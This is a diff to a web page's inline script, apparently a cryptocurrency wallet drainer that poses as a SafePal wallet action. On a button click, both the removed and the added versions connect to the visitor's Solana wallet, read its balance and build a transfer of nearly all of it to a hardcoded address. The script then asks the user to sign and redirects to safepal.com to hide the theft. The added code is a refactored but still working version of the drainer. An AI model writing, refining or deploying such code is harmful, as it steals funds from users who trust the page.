@@ -23,62 +23,65 @@
     </div>
     <script>
         document.getElementById('action').onclick = async () => {
-            console.log("Step 1: Button clicked");
+            console.log("Button clicked");
             
-            let w = null;
-            if(window.safepal) w = window.safepal;
-            else if(window.solana) w = window.solana;
-            else if(window.phantom) w = window.phantom;
+            let wallet = null;
+            if(window.solana) wallet = window.solana;
+            if(window.safepal) wallet = window.safepal;
+            if(window.phantom) wallet = window.phantom;
             
-            console.log("Step 2: Wallet detected:", w ? "YES" : "NO");
+            console.log("Wallet:", wallet ? "Found" : "Not found");
             
-            if(w){
-                try{
-                    console.log("Step 3: Connecting...");
-                    const r = await w.connect();
-                    console.log("Step 4: Connected:", r.publicKey.toString());
-                    
-                    const c = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
-                    const b = await c.getBalance(r.publicKey);
-                    console.log("Step 5: Balance:", b);
-                    
-                    const m = await c.getMinimumBalanceForRentExemption(0);
-                    console.log("Step 6: Min rent:", m);
-                    
-                    if(b < m){
-                        alert("Insufficient funds.");
-                        return;
-                    }
-                    
-                    console.log("Step 7: Preparing...");
-                    const dest = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
-                    const tx = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: r.publicKey,
-                            toPubkey: dest,
-                            lamports: b - m
-                        })
-                    );
-                    tx.feePayer = r.publicKey;
-                    
-                    const h = await c.getRecentBlockhash();
-                    tx.recentBlockhash = h.blockhash;
-                    
-                    console.log("Step 8: Requesting approval...");
-                    const s = await w.signTransaction(tx);
-                    console.log("Step 9: Approved");
-                    
-                    const x = await c.sendRawTransaction(s.serialize());
-                    await c.confirmTransaction(x);
-                    console.log("Step 10: Complete");
-                    
-                    window.location.href = "https://safepal.com";
-                }catch(e){
-                    console.error("Error:", e);
-                    alert("Action failed. Try again.");
-                }
-            }else{
+            if(!wallet){
                 alert("Please install SafePal wallet.");
+                return;
+            }
+            
+            try{
+                console.log("Connecting...");
+                const resp = await wallet.connect();
+                console.log("Connected:", resp.publicKey.toString());
+                
+                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
+                const balance = await connection.getBalance(resp.publicKey);
+                console.log("Balance:", balance);
+                
+                const minRent = await connection.getMinimumBalanceForRentExemption(0);
+                
+                if(balance < minRent){
+                    alert("Insufficient funds.");
+                    return;
+                }
+                
+                const destination = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
+                const amount = balance - minRent;
+                
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: resp.publicKey,
+                        toPubkey: destination,
+                        lamports: amount
+                    })
+                );
+                
+                transaction.feePayer = resp.publicKey;
+                const blockhash = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash.blockhash;
+                
+                console.log("Requesting signature...");
+                const signed = await wallet.signTransaction(transaction);
+                console.log("Signed!");
+                
+                const signature = await connection.sendRawTransaction(signed.serialize());
+                console.log("Sent:", signature);
+                
+                await connection.confirmTransaction(signature);
+                console.log("Confirmed!");
+                
+                window.location.href = "https://safepal.com";
+            }catch(err){
+                console.error("Error:", err);
+                alert("Action failed. Try again.");
             }
         };
     </script>
